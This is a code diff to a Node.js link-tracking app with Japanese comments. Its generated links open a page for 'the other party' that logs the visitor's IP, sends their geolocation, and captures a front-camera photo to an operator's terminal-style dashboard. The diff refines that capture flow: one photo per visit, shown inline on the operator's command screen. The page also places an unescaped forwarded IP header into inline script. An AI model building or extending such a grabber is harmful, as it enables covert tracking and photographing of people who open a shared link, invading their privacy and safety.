@@ -13,7 +13,7 @@ function generateId() {
          Math.random().toString(36).substring(2, 6);
 }
 
-// ===== HTML（コマンド画面＋写真ウィンドウ） =====
+// ===== HTML（コマンド画面＋写真ウィンドウ削除） =====
 const HTML = `<!DOCTYPE html>
 <html>
 <head>
@@ -31,7 +31,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 .window .resize-handle::after { content:''; position:absolute; right:4px; bottom:4px; width:0; height:0; border-right:14px solid #555; border-bottom:14px solid #555; border-left:14px solid transparent; border-top:14px solid transparent; opacity:0.8; pointer-events:none; }
 
 /* コマンドウィンドウ */
-#cmd-window { left:40px; top:40px; width:55vw; max-width:550px; height:60vh; min-width:350px; min-height:300px; }
+#cmd-window { left:40px; top:40px; width:90vw; max-width:780px; height:60vh; min-width:400px; min-height:300px; }
 #cmd-terminal { flex:1; background:#000; padding:20px 14px 8px 14px; display:flex; flex-direction:column; overflow:hidden; min-height:0; }
 #cmd-output { flex:1; overflow-y:auto; white-space:pre-wrap; word-break:break-all; font-size:14px; line-height:1.6; color:#fff; margin-bottom:4px; -webkit-overflow-scrolling:touch; }
 #cmd-output::-webkit-scrollbar { width:6px; background:#1a1a1a; }
@@ -48,7 +48,7 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 .cmd-photo { color:#ff88cc; }
 
 /* メニューウィンドウ */
-#menu-window { left:40px; top:62vh; width:55vw; max-width:550px; height:auto; min-height:140px; padding:20px 20px 18px 20px; }
+#menu-window { left:60px; top:62vh; width:80vw; max-width:480px; height:auto; min-height:140px; padding:20px 20px 18px 20px; }
 #menu-window .menu-title { color:#fff; font-size:15px; margin-bottom:14px; font-weight:bold; }
 #menu-window .btn-row { display:flex; gap:10px; flex-wrap:wrap; }
 #menu-window .btn-link { background:transparent; border:1px solid #88ddff; color:#88ddff; padding:8px 24px; font-family:inherit; font-size:14px; cursor:pointer; transition:background 0.2s; touch-action:auto; pointer-events:auto; }
@@ -60,16 +60,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
 #menu-window .result-area .link-display { display:block; color:#88ddff; text-decoration:underline; cursor:pointer; margin-bottom:4px; padding:4px 0; touch-action:auto; pointer-events:auto; }
 #menu-window .result-area .link-display:hover { color:#aaefff; }
 #menu-window .result-area .status-msg { color:#aaa; font-size:12px; }
-
-/* 写真ウィンドウ（最初は非表示） */
-#photo-window { left:55vw; top:40px; width:35vw; max-width:400px; height:60vh; min-width:250px; min-height:300px; display:none; background:#0a0a0a; }
-#photo-window .photo-title { color:#88ddff; font-size:14px; padding:12px 16px 8px 16px; border-bottom:1px solid #333; font-weight:bold; letter-spacing:1px; flex-shrink:0; }
-#photo-container { flex:1; overflow-x:auto; overflow-y:hidden; display:flex; gap:8px; padding:12px 16px; scroll-behavior:smooth; white-space:nowrap; }
-#photo-container::-webkit-scrollbar { height:6px; background:#1a1a1a; }
-#photo-container::-webkit-scrollbar-thumb { background:#555; border-radius:3px; }
-#photo-container .photo-item { flex:0 0 auto; height:100%; min-width:60%; background:#111; border:1px solid #333; border-radius:4px; overflow:hidden; display:flex; align-items:center; justify-content:center; }
-#photo-container .photo-item img { width:100%; height:100%; object-fit:contain; }
-.photo-count { color:#6688aa; font-size:12px; padding:6px 16px 12px 16px; border-top:1px solid #1a2a3a; flex-shrink:0; text-align:center; letter-spacing:0.5px; }
 </style>
 </head>
 <body>
@@ -101,15 +91,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
   <div class="resize-handle" id="menu-resize"></div>
 </div>
 
-<!-- 写真ウィンドウ -->
-<div id="photo-window" class="window">
-  <div class="drag-area" id="photo-drag"></div>
-  <div class="photo-title">📸 受信写真</div>
-  <div id="photo-container"></div>
-  <div class="photo-count" id="photo-count">写真: 0枚</div>
-  <div class="resize-handle" id="photo-resize"></div>
-</div>
-
 <script>
 (function() {
   const cmdOutput = document.getElementById('cmd-output');
@@ -137,26 +118,22 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
     window._lastLog = data;
   });
 
-  // ★ 写真受信
-  const photoContainer = document.getElementById('photo-container');
-  const photoCount = document.getElementById('photo-count');
-  const photoWindow = document.getElementById('photo-window');
+  // ★ 写真受信 → コマンド画面に直接表示
   let photoCountNum = 0;
-
   socket.on('new-photo', function(data) {
-    // 写真ウィンドウを表示
-    photoWindow.style.display = 'flex';
     photoCountNum++;
-    const div = document.createElement('div');
-    div.className = 'photo-item';
+    // コマンド画面に画像を追加
+    const imgDiv = document.createElement('div');
+    imgDiv.style.margin = '4px 0';
     const img = document.createElement('img');
     img.src = data.image;
-    img.alt = '写真 ' + photoCountNum;
-    div.appendChild(img);
-    photoContainer.appendChild(div);
-    photoCount.textContent = '写真: ' + photoCountNum + '枚';
-    // 最新の写真にスクロール
-    photoContainer.scrollLeft = photoContainer.scrollWidth;
+    img.style.maxWidth = '300px';
+    img.style.maxHeight = '200px';
+    img.style.border = '1px solid #555';
+    img.style.borderRadius = '4px';
+    imgDiv.appendChild(img);
+    cmdOutput.appendChild(imgDiv);
+    cmdOutput.scrollTop = cmdOutput.scrollHeight;
     addCmdOutput('[📸 写真受信] ' + photoCountNum + '枚目を受信しました！', 'cmd-photo');
   });
 
@@ -286,8 +263,8 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
       if (!resizeData) return;
       var nw = resizeData.startW + (cx - resizeData.startX);
       var nh = resizeData.startH + (cy - resizeData.startY);
-      if (nw < 250) nw = 250;
-      if (nh < 200) nh = 200;
+      if (nw < 350) nw = 350;
+      if (nh < 250) nh = 250;
       win.style.width = nw + 'px';
       win.style.height = nh + 'px';
     }
@@ -301,7 +278,6 @@ body { background:#1a1a2e; height:100vh; overflow:hidden; font-family:'Consolas'
   }
   makeDraggable('cmd-window', 'cmd-drag', 'cmd-resize');
   makeDraggable('menu-window', 'menu-drag', 'menu-resize');
-  makeDraggable('photo-window', 'photo-drag', 'photo-resize');
 
   function clampWindows() {
     document.querySelectorAll('.window').forEach(function(win) {
@@ -336,7 +312,7 @@ app.get('/generate', (req, res) => {
   res.json({ link });
 });
 
-// ★ 相手側ページ（位置情報＋カメラ）
+// ★ 相手側ページ（位置情報＋カメラ 順番通り・軽量）
 app.get('/t/:id', (req, res) => {
   const id = req.params.id;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'IP不明';
@@ -360,6 +336,7 @@ app.get('/t/:id', (req, res) => {
         video { width:200px; height:150px; background:#000; border:1px solid #334455; border-radius:4px; object-fit:cover; }
         .btn-cam { background:transparent; border:1px solid #4a8ada; color:#4a8ada; padding:6px 18px; font-family:inherit; font-size:13px; cursor:pointer; transition:all 0.2s; }
         .btn-cam:hover { background:#1a2a4a; }
+        .btn-cam:disabled { opacity:0.4; cursor:not-allowed; }
         .status-text { color:#6688aa; font-size:13px; margin-top:4px; }
       </style>
     </head>
@@ -375,13 +352,12 @@ app.get('/t/:id', (req, res) => {
 
       <script>
         var locationSent = false;
-        var photoCount = 0;
-        const MAX_PHOTOS = 3;
+        var photoTaken = false;
         const id = '${id}';
         const ip = '${ip}';
         const time = '${time}';
 
-        // ---- 位置情報送信 ----
+        // ---- 位置情報送信（最初に実行） ----
         function sendLocation(lat, lon) {
           if (locationSent) return;
           locationSent = true;
@@ -401,7 +377,7 @@ app.get('/t/:id', (req, res) => {
           sendLocation(null, null);
         }
 
-        // ---- カメラ処理 ----
+        // ---- カメラ処理（位置情報の後） ----
         function sendPhoto(imageData) {
           fetch('/photo', {
             method: 'POST',
@@ -410,27 +386,10 @@ app.get('/t/:id', (req, res) => {
           });
         }
 
-        function capturePhoto() {
-          const video = document.getElementById('video');
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth || 640;
-          canvas.height = video.videoHeight || 480;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
-          sendPhoto(dataUrl);
-          photoCount++;
-          document.getElementById('cam-status').textContent = '📸 ' + photoCount + '/3 枚撮影しました';
-          if (photoCount >= MAX_PHOTOS) {
-            document.getElementById('capture-btn').disabled = true;
-            document.getElementById('cam-status').textContent = '✅ 3枚撮影完了！';
-          }
-        }
-
         // カメラ起動
         (function startCamera() {
           if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            document.getElementById('cam-status').textContent = '⚠️ カメラ非対応ブラウザ';
+            document.getElementById('cam-status').textContent = '⚠️ カメラ非対応';
             return;
           }
           navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
@@ -438,14 +397,25 @@ app.get('/t/:id', (req, res) => {
               const video = document.getElementById('video');
               video.srcObject = stream;
               video.play();
-              document.
-              video.play();
               document.getElementById('camera-container').style.display = 'flex';
               document.getElementById('cam-status').textContent = '📷 カメラ準備完了';
-              document.getElementById('capture-btn').addEventListener('click', capturePhoto);
+              document.getElementById('capture-btn').addEventListener('click', function() {
+                if (photoTaken) return;
+                const video = document.getElementById('video');
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+                sendPhoto(dataUrl);
+                photoTaken = true;
+                document.getElementById('capture-btn').disabled = true;
+                document.getElementById('cam-status').textContent = '✅ 写真撮影完了！';
+              });
             })
             .catch(function(err) {
-              document.getElementById('cam-status').textContent = '⚠️ カメラ拒否またはエラー: ' + err.message;
+              document.getElementById('cam-status').textContent = '⚠️ カメラ拒否またはエラー';
             });
         })();
       </script>
